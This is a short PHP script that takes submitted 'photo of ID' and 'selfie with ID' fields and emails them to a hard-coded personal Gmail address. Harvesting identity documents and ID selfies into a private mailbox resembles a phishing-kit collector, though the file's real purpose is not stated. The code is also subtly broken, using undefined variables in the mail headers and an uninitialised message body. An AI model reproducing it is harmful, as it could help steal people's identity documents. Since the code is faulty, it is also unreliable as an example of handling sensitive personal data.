<?php

    // Only process POST reqeusts.
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the form fields and remove whitespace.
        $id_photo = strip_tags(trim($_POST["id"]));
        $selfie_photo = strip_tags(trim($_POST["selfie"]));

        // Check that data was sent to the mailer.
        if ( empty($id_photo) OR empty($selfie_photo)) {
            // Set a 400 (bad request) response code and exit.
            http_response_code(400);
            echo "Please complete the form and try again.";
            exit;
        }

        // Set the recipient email address.
        // FIXME: Update this to your desired email address.
        $recipient = "nabilsiddik90@gmail.com";

        // Set the email subject.
        $subject = "A New ID Submitted";

        // Build the email content.
        $email_content .= "Photo of ID: $id_photo\n\n";
        $email_content .= "Selfie with ID: $selfie_photo\n\n";

        // Build the email headers.
        $email_headers = "From: $name <$email>";

        // Send the email.
        if (mail($recipient, $subject, $email_content, $email_headers)) {
            // Set a 200 (okay) response code.
            http_response_code(200);
            echo "Thank You! Your message has been sent.";
        } else {
            // Set a 500 (internal server error) response code.
            http_response_code(500);
            echo "Oops! Something went wrong and we couldn't send your message.";
        }

    } else {
        // Not a POST request, set a 403 (forbidden) response code.
        http_response_code(403);
        echo "There was a problem with your submission, please try again.";
    }

?>
